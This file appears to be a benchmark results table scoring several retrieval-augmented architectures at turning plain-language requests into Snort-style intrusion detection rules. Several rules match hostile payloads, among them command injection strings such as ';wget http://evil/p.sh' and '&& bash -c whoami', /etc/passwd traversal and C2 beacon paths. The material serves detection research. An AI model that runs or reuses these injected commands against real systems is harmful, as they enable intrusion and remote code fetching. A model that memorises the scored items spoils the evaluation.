query,expected_attack_type,architecture,predicted_attack_type,attack_type_correct,valid_rule_or_benign,retrieval_hit_at_3,option_coverage,hallucination_risk,generated_rule
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_rerank,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 19""; flow:to_server,established; content:""|cmd.exe /c whoami""; nocase; classtype:web-application-attack; sid:9100099; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,rag_hybrid,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,multi_hop,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,graph_rag,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 1""; flow:to_server,established; content:"";wget http://evil/p.sh""; nocase; classtype:web-application-attack; sid:9100081; rev:1;)"
Detect command injection with cmd parameter and whoami in HTTP request,command_injection,agentic_rag,command_injection,True,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Command injection payload 7""; flow:to_server,established; content:""&& bash -c whoami""; nocase; classtype:web-application-attack; sid:9100087; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,baseline,directory_traversal,True,True,False,0.8888888888888888,0.35,"alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (msg:""LOCAL DIRECTORY TRAVERSAL detected""; flow:to_server,established; content:""../""; http_uri; content:""/etc/passwd""; http_uri; nocase; classtype:web-application-attack; sid:9051554; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_classic,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_rerank,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,rag_hybrid,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,multi_hop,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,graph_rag,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Alert when someone tries ../../../../etc/passwd directory traversal,directory_traversal,agentic_rag,directory_traversal,True,True,True,0.8888888888888888,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:""P1 Directory traversal attempt 1""; flow:to_server,established; content:""../""; nocase; pcre:""/(\.\.|%2f|win\.ini|passwd)/i""; classtype:web-application-attack; sid:9100101; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,baseline,dns_tunneling,True,False,False,0.6666666666666666,0.35,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""LOCAL DNS TUNNELING detected""; dsize:>120; pcre:""/^[A-Za-z0-9]{40,}\./""; classtype:policy-violation; sid:9468372; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_classic,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_rerank,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,rag_hybrid,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,multi_hop,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,graph_rag,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 2""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100122; rev:1;)"
Detect DNS tunneling using long encoded subdomains,dns_tunneling,agentic_rag,dns_tunneling,True,True,True,0.7777777777777778,0.0,"alert udp $HOME_NET any -> $EXTERNAL_NET 53 (msg:""P1 DNS tunneling long query 14""; content:""segment""; nocase; dsize:>70; classtype:trojan-activity; sid:9100134; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,baseline,icmp_sweep,True,True,False,0.6666666666666666,0.35,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL ICMP SWEEP detected""; itype:8; detection_filter:track by_src, count 15, seconds 60; classtype:attempted-recon; sid:9375244; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_classic,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 17""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100157; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_rerank,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 17""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100157; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,rag_hybrid,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 14""; dsize:>40; detection_filter:track by_src,count 7,seconds 5; classtype:attempted-recon; sid:9100154; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,multi_hop,command_injection,False,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""P1 Command injection payload 14""; flow:to_server,established; content:""; ping -c 1 198.51.100.8""; nocase; classtype:web-application-attack; sid:9100094; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,graph_rag,icmp_sweep,True,True,True,0.6666666666666666,0.0,"alert icmp $EXTERNAL_NET any -> $HOME_NET any (msg:""P1 ICMP sweep repeated echo requests 1""; dsize:>40; detection_filter:track by_src,count 6,seconds 5; classtype:attempted-recon; sid:9100141; rev:1;)"
Detect ICMP ping sweep against internal network,icmp_sweep,agentic_rag,command_injection,False,True,True,0.7777777777777778,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET 443 (msg:""P1 Command injection payload 14""; flow:to_server,established; content:""; ping -c 1 198.51.100.8""; nocase; classtype:web-application-attack; sid:9100094; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,baseline,malware_c2,True,True,False,1.0,0.35,"alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:""LOCAL MALWARE C2 detected""; flow:to_server,established; content:""/gate.php""; http_uri; content:""User-Agent|3A|""; http_header; nocase; classtype:trojan-activity; sid:9114534; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_classic,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_rerank,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,rag_hybrid,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,multi_hop,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,graph_rag,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 443 (msg:""P1 Malware C2 beacon 1""; flow:to_server,established; content:""/beacon""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100161; rev:1;)"
Detect malware command and control beacon to /gate.php,malware_c2,agentic_rag,malware_c2,True,True,True,0.8888888888888888,0.0,"alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:""P1 Malware C2 beacon 2""; flow:to_server,established; content:""/gate.php""; nocase; detection_filter:track by_src,count 4,seconds 300; classtype:trojan-activity; sid:9100162; rev:1;)"
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,baseline,benign_traffic,True,True,False,0.0,0.2,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_classic,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_rerank,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,rag_hybrid,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,multi_hop,benign_traffic,True,True,True,0.5555555555555556,0.0,"alert tcp $EXTERNAL_NET any -> $HOME_NET any (msg:""LOCAL BENIGN TRAFFIC detected""; flags:S; classtype:attempted-recon; sid:9035863; rev:1;)"
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,graph_rag,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
"Normal HTTP health check from the monitoring server, no attack",benign_traffic,agentic_rag,benign_traffic,True,True,True,0.0,0.0,NO_RULE_RECOMMENDED
